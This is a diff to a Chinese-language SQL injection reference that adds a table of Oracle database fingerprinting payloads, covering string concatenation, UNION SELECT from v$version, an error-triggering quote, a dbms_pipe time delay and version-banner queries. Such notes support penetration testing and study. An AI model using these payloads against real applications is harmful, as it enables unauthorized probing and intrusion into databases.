@@ -101,3 +101,14 @@ MySQL识别：
 |错误信息|id='|
 |默认变量|@@version_compile_os<br>@@version<br>@@basedir<br>@@datadir|
 |比较函数|conv('a',16,2)=conv('a',16,2)<br>connection_id()=connection_id()<br>crc32('MySQL')=crc32('MySQL')|
+
+Oracle识别：
+|描述|查询语句|
+|----|----|
+|字符串拼接|id='||'oracle' --|
+|函数|BITAND(1,1) –|
+|默认表|id='UNION SELECT 1 FROM v$version --|
+|错误信息|id='|
+|睡眠|dbms_pipe.receive_message(('a'),10)|
+|默认变量|SELECT banner FROM v$version<br>SELECT version FROM v$instance|
+|比较函数|ROWNUM=ROWNUM<br>RAWTOHEX('AB')=RAWTOHEX('AB')|
